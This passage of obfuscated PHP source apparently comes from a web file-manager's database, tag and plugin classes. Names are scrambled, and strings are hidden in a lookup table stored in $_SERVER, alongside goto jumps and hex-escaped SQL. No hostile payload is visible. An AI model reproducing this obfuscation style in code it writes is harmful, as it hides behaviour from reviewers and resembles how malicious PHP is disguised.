&& !preg_match($»Ú½«Œ”[1010], $¶˜ñ‚¤Õ)) { $¶˜ñ‚¤Õ = $»Ú½«Œ”[463] . trim($¶˜ñ‚¤Õ, $»Ú½«Œ”[463]) . $»Ú½«Œ”[463]; } return $¶˜ñ‚¤Õ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ªÓÍµ³ = '') { $–â¨‘ÁÒ =& $_SERVER[Î·Ü›öğ]; if (!class_exists($–â¨‘ÁÒ[1013])) { think_exception(think_lang($–â¨‘ÁÒ[14]) . $–â¨‘ÁÒ[1014]); } if (!empty($ªÓÍµ³)) { $this->config = $ªÓÍµ³; if (empty($this->config[$–â¨‘ÁÒ[17]])) { $this->config[$–â¨‘ÁÒ[17]] = array(); } } } public function connect($ƒ³èÄ›³ = '', $¨æ·¨¤‰ = 0) { $Âôıâ¤ì =& $_SERVER[Î·Ü›öğ]; if (!isset($this->linkID[$¨æ·¨¤‰])) { if (empty($ƒ³èÄ›³)) { $ƒ³èÄ›³ = $this->config; } $Šº¦’ı£ = !empty($ƒ³èÄ›³[$Âôıâ¤ì[17]][$Âôıâ¤ì[18]]) ? $ƒ³èÄ›³[$Âôıâ¤ì[17]][$Âôıâ¤ì[18]] : $this->pconnect; if ($Šº¦’ı£) { $ƒ³èÄ›³[$Âôıâ¤ì[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¨æ·¨¤‰] = new PDO($ƒ³èÄ›³[$Âôıâ¤ì[1015]], $ƒ³èÄ›³[$Âôıâ¤ì[987]], $ƒ³èÄ›³[$Âôıâ¤ì[988]], $ƒ³èÄ›³[$Âôıâ¤ì[17]]); } catch (PDOException $½Ùú§Ğ…) { think_exception($½Ùú§Ğ…->getMessage()); } $this->dbType = $this->_getDsnType($ƒ³èÄ›³[$Âôıâ¤ì[1015]]); if (in_array($this->dbType, array($Âôıâ¤ì[1016], $Âôıâ¤ì[1017], $Âôıâ¤ì[1018], $Âôıâ¤ì[1019]))) { think_exception($Âôıâ¤ì[1020] . $this->dbType . $Âôıâ¤ì[1021] . $this->dbType . $Âôıâ¤ì[1022]); } if (!$this->linkID[$¨æ·¨¤‰]) { think_exception($Âôıâ¤ì[1023]); } try { $this->linkID[$¨æ·¨¤‰]->exec($Âôıâ¤ì[1024] . think_config($Âôıâ¤ì[990])); } catch (Exception $½Ùú§Ğ…) { } $this->connected = !0; if (1 != think_config($Âôıâ¤ì[22])) { unset($this->config); } } return $this->linkID[$¨æ·¨¤‰]; } public function free() { $this->PDOStatement = null; } public function query($Ÿ¯ÕÛÄ€, $õ§Ÿß· = array()) { $ãß¹ú¸ =& $_SERVER[Î·Ü›öğ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿ¯ÕÛÄ€; if (!empty($õ§Ÿß·)) { $this->queryStr .= $ãß¹ú¸[1025] . print_r($õ§Ÿß·, !0) . $ãß¹ú¸[1026]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ãß¹ú¸[23], 1); think_status($ãß¹ú¸[24]); $this->PDOStatement = $this->_linkID->prepare($Ÿ¯ÕÛÄ€); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¤™ÈİßÑ = $this->PDOStatement->execute($õ§Ÿß·); $this->debug(); if (!1 === $¤™ÈİßÑ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¬Ö­Â¯é, $Óƒ·æËó = array()) { $Î…ÚÀû‰ =& $_SERVER[Î·Ü›öğ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¬Ö­Â¯é; if (!empty($Óƒ·æËó)) { $this->queryStr .= $Î…ÚÀû‰[1025] . print_r($Óƒ·æËó, !0) . $Î…ÚÀû‰[1026]; } $üÒÖÕ‰ = !1; if ($this->dbType == $Î…ÚÀû‰[1019]) { if (preg_match($Î…ÚÀû‰[1027], $this->queryStr, $¥Œ°—Ê§)) { $this->table = think_config($Î…ÚÀû‰[1028]) . str_ireplace(think_config($Î…ÚÀû‰[1029]), $Î…ÚÀû‰[456], $¥Œ°—Ê§[2]); $üÒÖÕ‰ = (bool) $this->query($Î…ÚÀû‰[1030] . strtoupper($this->table) . $Î…ÚÀû‰[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Î…ÚÀû‰[25], 1); think_status($Î…ÚÀû‰[24]); $this->PDOStatement = $this->_linkID->prepare($¬Ö­Â¯é); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $§Í‰¢Şò = $this->PDOStatement->execute($Óƒ·æËó); $this->debug(); if (!1 === $§Í‰¢Şò) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($üÒÖÕ‰ || preg_match($Î…ÚÀû‰[1031], $¬Ö­Â¯é)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¨…‡¶ Ÿ = $this->_linkID->commit(); $this->transTimes = 0; if (!$¨…‡¶ Ÿ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $®ËãÔÚõ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$®ËãÔÚõ) { $this->error(); return !1; } } return !0; } private function getAll() { $÷Š•½Ø = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($÷Š•½Ø); return $÷Š•½Ø; } public function getFields($¨¯¥ìı») { $„ÈÄÖÕ» =& $_SERVER[Î·Ü›öğ]; $this->initConnect(!0); if (think_config($„ÈÄÖÕ»[1032])) { $Ä»ŒŸ = str_replace($„ÈÄÖÕ»[1033], $¨¯¥ìı», think_config($„ÈÄÖÕ»[1032])); } else { switch ($this->dbType) { case $„ÈÄÖÕ»[1016]: case $„ÈÄÖÕ»[1034]: $Ä»ŒŸ = "\x53\105\114\x45\103\x54\x20\40\40\143\x6f\154\x75\155\156\x5f\156\141\155\145\40\141\x73\40\x27\x4e\141\x6d\x65\x27\54\x20\x20\40\144\141\164\141\x5f\x74\171\160\x65\x20\x61\163\40\x27\x54\171\160\145\47\x2c\40\x20\40\143\x6f\154\x75\x6d\x6e\x5f\x64\x65\146\141\x75\154\164\x20\x61\163\40\47\104\x65\146\141\x75\x6c\164\x27\54\40\40\40\151\x73\137\x6e\165\154\x6c\x61\142\154\x65\x20\141\163\x20\x27\116\x75\154\154\x27\xa\x9\x9\x46\x52\117\115\x9\x69\156\x66\157\162\155\141\x74\x69\157\x6e\x5f\x73\x63\x68\145\155\x61\56\x74\x61\x62\x6c\145\x73\40\x41\123\x20\164\12\11\11\x4a\117\x49\116\x9\151\x6e\146\x6f\x72\x6d\x61\x74\151\157\x6e\x5f\x73\143\150\x65\x6d\x61\56\x63\x6f\x6c\x75\155\156\x73\x20\101\x53\40\x63\12\11\x9\x4f\x4e\x20\40\164\56\164\141\142\154\x65\x5f\x63\x61\164\141\154\157\147\x20\x3d\40\x63\56\x74\x61\x62\x6c\145\137\143\x61\x74\x61\x6c\157\x67\12\11\x9\101\116\x44\40\x74\x2e\x74\x61\x62\154\145\137\163\x63\x68\x65\x6d\141\x20\x3d\40\x63\x2e\164\141\142\154\145\x5f\163\x63\150\x65\155\141\12\x9\11\x41\x4e\104\x20\x74\x2e\x74\x61\142\154\145\x5f\x6e\141\x6d\x65\40\x3d\40\143\x2e\164\x61\x62\154\145\x5f\156\x61\155\x65\xa\11\x9\x57\110\x45\122\105\x20\x20\40\x74\x2e\164\x61\x62\154\145\x5f\x6e\x61\x6d\145\x20\75\40\47{$¨¯¥ìı»}\x27"; break; case $„ÈÄÖÕ»[1035]: $Ä»ŒŸ = $„ÈÄÖÕ»[1036] . $¨¯¥ìı» . $„ÈÄÖÕ»[1037]; break; case $„ÈÄÖÕ»[1017]: case $„ÈÄÖÕ»[1019]: $Ä»ŒŸ = $„ÈÄÖÕ»[1038] . $„ÈÄÖÕ»[1039] . $„ÈÄÖÕ»[1040] . strtoupper($¨¯¥ìı») . $„ÈÄÖÕ»[1041] . strtoupper($¨¯¥ìı») . $„ÈÄÖÕ»[1042]; break; case $„ÈÄÖÕ»[1043]: $Ä»ŒŸ = $„ÈÄÖÕ»[1044] . $¨¯¥ìı» . $„ÈÄÖÕ»[1045]; break; case $„ÈÄÖÕ»[1018]: break; case $„ÈÄÖÕ»[1046]: default: $Ä»ŒŸ = $„ÈÄÖÕ»[1047] . ($this->dbType == $„ÈÄÖÕ»[1046] ? "\140{$¨¯¥ìı»}\140" : $¨¯¥ìı»); } } $øÂ…Ã½‡ = $this->query($Ä»ŒŸ); $—ü´½®„ = array(); if ($øÂ…Ã½‡) { foreach ($øÂ…Ã½‡ as $…ÙÍñß => $Ìñ¶˜©) { $Ìñ¶˜© = array_change_key_case($Ìñ¶˜©); $Ìñ¶˜©[$„ÈÄÖÕ»[32]] = isset($Ìñ¶˜©[$„ÈÄÖÕ»[32]]) ? $Ìñ¶˜©[$„ÈÄÖÕ»[32]] : $„ÈÄÖÕ»[456]; $Ìñ¶˜©[$„ÈÄÖÕ»[33]] = isset($Ìñ¶˜©[$„ÈÄÖÕ»[33]]) ? $Ìñ¶˜©[$„ÈÄÖÕ»[33]] : $„ÈÄÖÕ»[456]; $­÷¸ÎûÖ = isset($Ìñ¶˜©[$„ÈÄÖÕ»[353]]) ? $Ìñ¶˜©[$„ÈÄÖÕ»[353]] : $Ìñ¶˜©[$„ÈÄÖÕ»[32]]; $—ü´½®„[$­÷¸ÎûÖ] = array($„ÈÄÖÕ»[32] => $­÷¸ÎûÖ, $„ÈÄÖÕ»[33] => $Ìñ¶˜©[$„ÈÄÖÕ»[33]], $„ÈÄÖÕ»[35] => (bool) (isset($Ìñ¶˜©[$„ÈÄÖÕ»[106]]) && $Ìñ¶˜©[$„ÈÄÖÕ»[106]] === $„ÈÄÖÕ»[12] || isset($Ìñ¶˜©[$„ÈÄÖÕ»[35]]) && $Ìñ¶˜©[$„ÈÄÖÕ»[35]] === $„ÈÄÖÕ»[12]), $„ÈÄÖÕ»[37] => isset($Ìñ¶˜©[$„ÈÄÖÕ»[37]]) ? $Ìñ¶˜©[$„ÈÄÖÕ»[37]] : (isset($Ìñ¶˜©[$„ÈÄÖÕ»[56]]) ? $Ìñ¶˜©[$„ÈÄÖÕ»[56]] : $„ÈÄÖÕ»[456]), $„ÈÄÖÕ»[39] => isset($Ìñ¶˜©[$„ÈÄÖÕ»[97]]) ? strtolower($Ìñ¶˜©[$„ÈÄÖÕ»[97]]) == $„ÈÄÖÕ»[41] : (isset($Ìñ¶˜©[$„ÈÄÖÕ»[57]]) ? $Ìñ¶˜©[$„ÈÄÖÕ»[57]] : !1), $„ÈÄÖÕ»[42] => isset($Ìñ¶˜©[$„ÈÄÖÕ»[1048]]) ? strtolower($Ìñ¶˜©[$„ÈÄÖÕ»[1048]]) == $„ÈÄÖÕ»[44] : (isset($Ìñ¶˜©[$„ÈÄÖÕ»[97]]) ? $Ìñ¶˜©[$„ÈÄÖÕ»[97]] : !1)); } } return $—ü´½®„; } public function getTables($¾¶¡²ÙÊ = '') { $â‡’š¹» =& $_SERVER[Î·Ü›öğ]; if (think_config($â‡’š¹»[1049])) { $†ä¹’¡ñ = str_replace($â‡’š¹»[1050], $¾¶¡²ÙÊ, think_config($â‡’š¹»[1049])); } else { switch ($this->dbType) { case $â‡’š¹»[1017]: case $â‡’š¹»[1019]: $†ä¹’¡ñ = $â‡’š¹»[1051]; break; case $â‡’š¹»[1016]: case $â‡’š¹»[1034]: $†ä¹’¡ñ = $â‡’š¹»[1052]; break; case $â‡’š¹»[1043]: $†ä¹’¡ñ = $â‡’š¹»[1053]; break; case $â‡’š¹»[1018]: think_exception(think_lang($â‡’š¹»[1054]) . $â‡’š¹»[1055]); break; case $â‡’š¹»[1035]: $†ä¹’¡ñ = $â‡’š¹»[45] . $â‡’š¹»[46] . $â‡’š¹»[47]; break; case $â‡’š¹»[1046]: default: if (!empty($¾¶¡²ÙÊ)) { $†ä¹’¡ñ = $â‡’š¹»[998] . $¾¶¡²ÙÊ . $â‡’š¹»[999]; } else { $†ä¹’¡ñ = $â‡’š¹»[1000]; } } } $‚‚‹Í•û = $this->query($†ä¹’¡ñ); $èŸ¿Şê = array(); foreach ($‚‚‹Í•û as $éäÕü›ë => $óœá‡ÀÉ) { $èŸ¿Şê[$éäÕü›ë] = current($óœá‡ÀÉ); } return $èŸ¿Şê; } protected function parseLimit($£‹ãµÁ‹) { $™ÜÖğÓ =& $_SERVER[Î·Ü›öğ]; $šÏö€ğ = $™ÜÖğÓ[12]; if (!empty($£‹ãµÁ‹)) { switch ($this->dbType) { case $™ÜÖğÓ[1043]: case $™ÜÖğÓ[1035]: $£‹ãµÁ‹ = explode($™ÜÖğÓ[50], $£‹ãµÁ‹); if (count($£‹ãµÁ‹) > 1) { $šÏö€ğ .= $™ÜÖğÓ[51] . $£‹ãµÁ‹[1] . $™ÜÖğÓ[52] . $£‹ãµÁ‹[0] . $™ÜÖğÓ[53]; } else { $šÏö€ğ .= $™ÜÖğÓ[51] . $£‹ãµÁ‹[0] . $™ÜÖğÓ[53]; } break; case $™ÜÖğÓ[1016]: case $™ÜÖğÓ[1034]: break; case $™ÜÖğÓ[1018]: break; case $™ÜÖğÓ[1017]: case $™ÜÖğÓ[1019]: break; case $™ÜÖğÓ[1046]: default: $šÏö€ğ .= $™ÜÖğÓ[51] . $£‹ãµÁ‹ . $™ÜÖğÓ[53]; } } return $šÏö€ğ; } public function parseKey(&$ÒŞîŸ›õ, $èÑŸÔî‡ = true) { $ÒèäĞ¦ =& $_SERVER[Î·Ü›öğ]; if ($èÑŸÔî‡) { $ÒŞîŸ›õ = $this->parseKeyCheck($ÒŞîŸ›õ); } if ($this->dbType == $ÒèäĞ¦[1046]) { if ($ÒŞîŸ›õ != $ÒèäĞ¦[223] && !preg_match($ÒèäĞ¦[1010], $ÒŞîŸ›õ)) { $ÒŞîŸ›õ = $ÒèäĞ¦[463] . trim($ÒŞîŸ›õ, $ÒèäĞ¦[463]) . $ÒèäĞ¦[463]; } return $ÒŞîŸ›õ; } else { return parent::parseKey($ÒŞîŸ›õ, $èÑŸÔî‡); } } public function close() { $this->_linkID = null; } public function error() { $óŸÛ†½¥ =& $_SERVER[Î·Ü›öğ]; if ($this->PDOStatement) { $‚–•™×Á = $this->PDOStatement->errorInfo(); $this->error = $‚–•™×Á[1] . $óŸÛ†½¥[4] . $‚–•™×Á[2]; } else { $this->error = $óŸÛ†½¥[12]; } if ($óŸÛ†½¥[12] != $this->queryStr) { $this->error .= LNG($óŸÛ†½¥[48]) . $this->queryStr; } think_trace($this->error, $óŸÛ†½¥[12], $óŸÛ†½¥[49]); return $this->error; } public function escapeString($‡À€×–) { $”°ëû‹ =& $_SERVER[Î·Ü›öğ]; switch ($this->dbType) { case $”°ëû‹[1043]: case $”°ëû‹[1016]: case $”°ëû‹[1034]: case $”°ëû‹[1046]: return addslashes($‡À€×–); case $”°ëû‹[1018]: case $”°ëû‹[1035]: case $”°ëû‹[1017]: case $”°ëû‹[1019]: return str_ireplace($”°ëû‹[58], $”°ëû‹[59], $‡À€×–); } } protected function parseValue($‘ı®‘¹ü) { $Åç¯ó„ò =& $_SERVER[Î·Ü›öğ]; if (is_string($‘ı®‘¹ü)) { $‡ÛÇÙ­ = strpos($‘ı®‘¹ü, $Åç¯ó„ò[4]) === 0 && in_array($‘ı®‘¹ü, array_keys($this->bind)); $‘ı®‘¹ü = $‡ÛÇÙ­ ? $this->escapeString($‘ı®‘¹ü) : $Åç¯ó„ò[1056] . $this->escapeString($‘ı®‘¹ü) . $Åç¯ó„ò[1056]; } elseif (isset($‘ı®‘¹ü[0]) && is_string($‘ı®‘¹ü[0]) && strtolower($‘ı®‘¹ü[0]) == $Åç¯ó„ò[374]) { $‘ı®‘¹ü = $this->escapeString($‘ı®‘¹ü[1]); } elseif (is_array($‘ı®‘¹ü)) { $‘ı®‘¹ü = array_map(array($this, $Åç¯ó„ò[1057]), $‘ı®‘¹ü); } elseif (is_bool($‘ı®‘¹ü)) { $‘ı®‘¹ü = $‘ı®‘¹ü ? $Åç¯ó„ò[91] : $Åç¯ó„ò[231]; } elseif (is_null($‘ı®‘¹ü)) { $‘ı®‘¹ü = $Åç¯ó„ò[106]; } return $‘ı®‘¹ü; } public function getLastInsertId() { $²¾òëá =& $_SERVER[Î·Ü›öğ]; switch ($this->dbType) { case $²¾òëá[1043]: case $²¾òëá[1035]: case $²¾òëá[1016]: case $²¾òëá[1034]: case $²¾òëá[1018]: case $²¾òëá[1046]: return $this->_linkID->lastInsertId(); case $²¾òëá[1017]: case $²¾òëá[1019]: $É¿Ïæ‚Ğ = $this->table; $ßŠ•åßª = $this->query("\123\105\114\x45\103\124\x20{$É¿Ïæ‚Ğ}\x2e\143\165\x72\x72\x76\x61\x6c\40\x63\165\162\162\166\x61\x6c\x20\x46\122\117\x4d\x20\144\165\141\x6c"); return $ßŠ•åßª ? $ßŠ•åßª[0][$²¾òëá[1058]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($¿¹îÑ­í) { $çÁò¬èÜ =& $_SERVER[Î·Ü›öğ]; if (!CacheLock::fileLock($çÁò¬èÜ[13])) { return !1; } $ş°Ôı†Ö = parent::query($¿¹îÑ­í); CacheLock::fileUnLock($çÁò¬èÜ[13]); return $ş°Ôı†Ö; } public function execute($¥ÔßıÜİ) { $ÄÃŠ—Üª =& $_SERVER[Î·Ü›öğ]; if (!CacheLock::fileLock($ÄÃŠ—Üª[13])) { return !1; } $´Àğ—ª¡ = parent::execute($¥ÔßıÜİ); CacheLock::fileUnLock($ÄÃŠ—Üª[13]); return $´Àğ—ª¡; } } goto càøÕ‹ºÑä; e‘°É«âÈ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\146\x61\166"; protected function cacheFunctionAlias($Üš×àûê) { $æß’šñ› =& $_SERVER[Î·Ü›öğ]; return array($æß’šñ›[2123] => array($Üš×àûê[0], $æß’šñ›[2124]), $æß’šñ›[2125] => array($Üš×àûê[0], $æß’šñ›[2126])); } protected function get($ªÊ‡ª•) { $œ±‚îõ =& $_SERVER[Î·Ü›öğ]; $‹¿éóã± = Model($œ±‚îõ[598])->metaGet($ªÊ‡ª•, $œ±‚îõ[2127]); $ÊÆºÊ¥ = json_decode($‹¿éóã±, !0); return $ÊÆºÊ¥ ? $ÊÆºÊ¥ : array($œ±‚îõ[2128] => $œ±‚îõ[91], $œ±‚îõ[447] => array()); } protected function set($–„æŞìÎ, $ë•“üÚø) { $ä…¹Ê¨Ş =& $_SERVER[Î·Ü›öğ]; $ë•“üÚø = $ë•“üÚø ? $ë•“üÚø : array($ä…¹Ê¨Ş[2128] => $ä…¹Ê¨Ş[91], $ä…¹Ê¨Ş[447] => array()); return Model($ä…¹Ê¨Ş[598])->metaSet($–„æŞìÎ, $ä…¹Ê¨Ş[2127], json_encode($ë•“üÚø)); } protected function getByTagID($˜Á— ‚, $ğ úèˆ) { $ïÁÂˆßÅ =& $_SERVER[Î·Ü›öğ]; if (!$˜Á— ‚ || !$ğ úèˆ) { return !1; } if (!Model($ïÁÂˆßÅ[598])->getInfoSimple($˜Á— ‚)) { return !1; } $”é‚áşÖ = $this->get($˜Á— ‚); if (!$”é‚áşÖ || !isset($”é‚áşÖ[$ïÁÂˆßÅ[447]])) { return !1; } $Ğ¨Òõèë = array_find_by_field($”é‚áşÖ[$ïÁÂˆßÅ[447]], $ïÁÂˆßÅ[477], $ğ úèˆ); return is_array($Ğ¨Òõèë) ? $Ğ¨Òõèë : !1; } public function listSource($™Š¡è, $¹ƒÑËĞ©) { $ª·ªºÜ÷ =& $_SERVER[Î·Ü›öğ]; if ($¹ƒÑËĞ© && !is_array($¹ƒÑËĞ©)) { $¹ƒÑËĞ© = array($¹ƒÑËĞ©); } $ËŒº‰«ø = $this->listData($™Š¡è); $¿†îÉ = array(); foreach ($ËŒº‰«ø as $ƒÀ‰±©à) { $¨âëˆ‹¦ = $ƒÀ‰±©à[$ª·ªºÜ÷[87]]; if (!$¨âëˆ‹¦) { continue; } if (!isset($¿†îÉ[$¨âëˆ‹¦])) { $¿†îÉ[$¨âëˆ‹¦] = array(); } $¿†îÉ[$¨âëˆ‹¦][] = $ƒÀ‰±©à[$ª·ªºÜ÷[511]]; } $¯Ûü¹á = array(); foreach ($¿†îÉ as $´õõâ³„ => $ıÃÛ©âµ) { $®µ°¹Øš = !0; if (!$¹ƒÑËĞ©) { $¯Ûü¹á[] = $´õõâ³„; continue; } foreach ($¹ƒÑËĞ© as $œ°«ÜÑ¸) { if (!in_array($œ°«ÜÑ¸, $ıÃÛ©âµ)) { $®µ°¹Øš = !1; break; } } if ($®µ°¹Øš) { $¯Ûü¹á[] = $´õõâ³„; } } if (!$¯Ûü¹á) { return array(); } $Êæ†¦ŞĞ = array($ª·ªºÜ÷[502] => array($ª·ªºÜ÷[503], $¯Ûü¹á), $ª·ªºÜ÷[582] => $™Š¡è, $ª·ªºÜ÷[191] => SourceModel::TYPE_GROUP); $ˆ©Ë÷÷æ = Model($ª·ªºÜ÷[1458])->listSource($Êæ†¦ŞĞ); if (!$ˆ©Ë÷÷æ || count($¯Ûü¹á) == $ˆ©Ë÷÷æ[$ª·ªºÜ÷[444]][$ª·ªºÜ÷[445]]) { return $ˆ©Ë÷÷æ; } $õ¶¶¨ = array(); $»¼û¶¹¶ = array_to_keyvalue($ˆ©Ë÷÷æ[$ª·ªºÜ÷[85]], $ª·ªºÜ÷[12], $ª·ªºÜ÷[194]); $õ¥ØƒÊğ = array_to_keyvalue($ˆ©Ë÷÷æ[$ª·ªºÜ÷[86]], $ª·ªºÜ÷[12], $ª·ªºÜ÷[194]); $’•ÑÛ  = array_merge($õ¥ØƒÊğ, $»¼û¶¹¶); foreach ($¯Ûü¹á as $¨âëˆ‹¦) { if (!in_array($¨âëˆ‹¦, $’•ÑÛ )) { $õ¶¶¨[] = $¨âëˆ‹¦; } } if ($õ¶¶¨) { $this->removeBySource($™Š¡è, $õ¶¶¨); } return $ˆ©Ë÷÷æ; } protected function listData($Ë’Åçèã) { $ƒ‘ıßİÍ =& $_SERVER[Î·Ü›öğ]; $ˆ”âÄËå = array($ƒ‘ıßİÍ[1801] => 0, $ƒ‘ıßİÍ[570] => array($ƒ‘ıßİÍ[2129], 0), $ƒ‘ıßİÍ[507] => $ƒ‘ıßİÍ[1416] . $Ë’Åçèã); $é–æˆÍâ = $ƒ‘ıßİÍ[2130]; $Ø»íö  = $this->field($é–æˆÍâ)->where($ˆ”âÄËå)->order($ƒ‘ıßİÍ[2131])->select(); return $Ø»íö  ? $Ø»íö  : array(); } protected function addToTag($ÆÜ×º’‰, $ò™ÊÕ¤, $–›ß¡ì) { $úáõÖ‹— =& $_SERVER[Î·Ü›öğ]; if (!$this->getByTagID($ÆÜ×º’‰, $–›ß¡ì) || !$ò™ÊÕ¤) { return !1; } if (!Model($úáõÖ‹—[922])->pathInfo($ò™ÊÕ¤)) { return !1; } $š…ê«¦• = array($úáõÖ‹—[1801] => 0, $úáõÖ‹—[570] => $–›ß¡ì, $úáõÖ‹—[506] => $ò™ÊÕ¤, $úáõÖ‹—[507] => $úáõÖ‹—[2132] . $ÆÜ×º’‰, $úáõÖ‹—[505] => $úáõÖ‹—[12], $úáõÖ‹—[2014] => 0); if ($this->where($š…ê«¦•)->find()) { return !1; } return $this->add($š…ê«¦•); } protected function removeFromTag($ãê›øä°, $®²Î³ƒ­, $Ù‚ÜŒâë) { $êëË°“ƒ =& $_SERVER[Î·Ü›öğ]; if (!$this->getByTagID($ãê›øä°, $Ù‚ÜŒâë) || !$®²Î³ƒ­) { return !1; } if (is_array($®²Î³ƒ­)) { $®²Î³ƒ­ = array($êëË°“ƒ[7], $®²Î³ƒ­); } $ÂÚ’¶Üˆ = array($êëË°“ƒ[1801] => 0, $êëË°“ƒ[570] => $Ù‚ÜŒâë, $êëË°“ƒ[507] => $êëË°“ƒ[2132] . $ãê›øä°, $êëË°“ƒ[506] => $®²Î³ƒ­); return $this->where($ÂÚ’¶Üˆ)->delete(); } protected function removeByTag($¸µÛíØ–, $£Ó×ªŒÆ) { $Ç³¢ƒÊš =& $_SERVER[Î·Ü›öğ]; if (!$this->getByTagID($¸µÛíØ–, $£Ó×ªŒÆ)) { return !1; } $™¹É««î = array($Ç³¢ƒÊš[1801] => 0, $Ç³¢ƒÊš[570] => $£Ó×ªŒÆ, $Ç³¢ƒÊš[507] => $Ç³¢ƒÊš[2132] . $¸µÛíØ–); return $this->where($™¹É««î)->delete(); } protected function removeBySource($ªşØÊ†Ç, $÷ÙÂµ÷») { $éÇ“òğÀ =& $_SERVER[Î·Ü›öğ]; if (!$ªşØÊ†Ç || !$÷ÙÂµ÷») { return !1; } if (is_array($÷ÙÂµ÷»)) { $÷ÙÂµ÷» = array($éÇ“òğÀ[7], $÷ÙÂµ÷»); } $ÚØÙ÷Š• = array($éÇ“òğÀ[1801] => 0, $éÇ“òğÀ[506] => $÷ÙÂµ÷», $éÇ“òğÀ[570] => array($éÇ“òğÀ[1113], 0), $éÇ“òğÀ[507] => $éÇ“òğÀ[2132] . $ªşØÊ†Ç); return $this->where($ÚØÙ÷Š•)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\145\x6d\56\160\x6c\165\147\151\156\114\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\163\164\141\x74\x75\x73", "\162\145\147\151\x65\x73\x74", "\x63\157\x6e\x66\x69\x67"); public function loadList($­åÃ´²À = false) { $ºü¢¢¹ı = array_to_keyvalue($this->listData(), $_SERVER[Î·Ü›öğ][32]); if ($­åÃ´²À) { return $ºü¢¢¹ı[$­åÃ´²À]; } return $ºü¢¢¹ı; } public function init() { $éâ’–§’ =& $_SERVER[Î·Ü›öğ]; Hook::trigger($éâ’–§’[2133]); $äøÙ³’ = $this->loadPluginList(); foreach ($äøÙ³’ as $İâİİ§¡ => $Å°–†Š—) { $İ¦½‰î¶ = $this->appAllow($İâİİ§¡, $Å°–†Š—); if (!$İ¦½‰î¶) { continue; } foreach ($Å°–†Š—[$éâ’–§’[2134]] as $±¢‘ì‹ä => $ÆÏ”òÇ) { Hook::bind($±¢‘ì‹ä, $ÆÏ”òÇ); } } Hook::trigger($éâ’–§’[2135]); Hook::trigger(ACTION); } public function appAllow($¬Ô“ËİÊ, $üò°–é•, $õ›½Í‘ = true) { $ÖÅğ¢Ü =& $_SERVER[Î·Ü›öğ]; $‹ËÑü„š = PLUGIN_DIR . $¬Ô“ËİÊ . $ÖÅğ¢Ü[2136]; if (!is_array($üò°–é•) || !is_array($üò°–é•[$ÖÅğ¢Ü[2134]]) || $üò°–é•[$ÖÅğ¢Ü[839]] != 1 || !is_file($‹ËÑü„š)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ÖÅğ¢Ü[6]][$ÖÅğ¢Ü[2137]] || !$GLOBALS[$ÖÅğ¢Ü[6]][$ÖÅğ¢Ü[2138]]) { return !0; } $Ë¥É¦¨Ó = explode($ÖÅğ¢Ü[50], strtolower($GLOBALS[$ÖÅğ¢Ü[6]][$ÖÅğ¢Ü[2138]])); return in_array(strtolower($¬Ô“ËİÊ), $Ë¥É¦¨Ó) ? !1 : !0; } if ($õ›½Í‘ && !Action($ÖÅğ¢Ü[2139])->checkAuth($¬Ô“ËİÊ)) { return !1; } return !0; } public function unInstall($·Ö³øøì) { $§Ê­¾Ò =& $_SERVER[Î·Ü›öğ]; $ƒ ï×Úó = $this->loadList($·Ö³øøì); if (file_exists(PLUGIN_DIR . $·Ö³øøì)) { Hook::apply($·Ö³øøì . $§Ê­¾Ò[2140]); } $this->remove($ƒ ï×Úó[$§Ê­¾Ò[477]]); } public function changeStatus($‡Œ«İ™, $Õø›¦ó”) { $È›à¶‚ä =& $_SERVER[Î·Ü›öğ]; $İĞøòñø = $this->loadList($‡Œ«İ™); if ($Õø›¦ó”) { Hook::apply($‡Œ«İ™ . $È›à¶‚ä[2141]); } $this->update($İĞøòñø[$È›à¶‚ä[477]], array($È›à¶‚ä[2142] => $Õø›¦ó”)); } public function appRegist($å¼£ÅÕœ, $¾Øˆíùñ) { $†­…—èò =& $_SERVER[Î·Ü›öğ]; $ıˆ¨ù’ì = $this->loadList($å¼£ÅÕœ); if ($ıˆ¨ù’ì) { $this->update($ıˆ¨ù’ì[$†­…—èò[477]], array($†­…—èò[2134] => $¾Øˆíùñ)); } else { $„ÏÖúï  = array($†­…—èò[32] => $å¼£ÅÕœ, $†­…—èò[2134] => $¾Øˆíùñ, $†­…—èò[839] => 0, $†­…—èò[6] => $this->getConfigDefault($å¼£ÅÕœ)); $this->insert($„ÏÖúï ); } } public function getConfigDefault($©ÇÉœá†) { $èÂ—‚½û =& $_SERVER[Î·Ü›öğ]; $½‰ì‰óò = array(); $­Ë³Ëš½ = $this->getPackageJson($©ÇÉœá†); if (!$­Ë³Ëš½ && is_array($­Ë³Ëš½[$èÂ—‚½û[2143]])) { return $½‰ì‰óò; } foreach ($­Ë³Ëš½[$èÂ—‚½û[2143]] as $çÍ¤ÉöÒ => $ŒÎÛô‘É) { if (!isset($ŒÎÛô‘É[$èÂ—‚½û[452]]) || isset($½‰ì‰óò[$çÍ¤ÉöÒ])) { continue; } $½‰ì‰óò[$çÍ¤ÉöÒ] = $ŒÎÛô‘É[$èÂ—‚½û[452]]; } return $½‰ì‰óò; } public function getPackageJson($ÄšÀË½©) { return Hook::apply($ÄšÀË½© . $_SERVER[Î·Ü›öğ][2144]); } public function getConfig($ÓğÅàÅ, $˜Å¿µÚ‰ = false) { 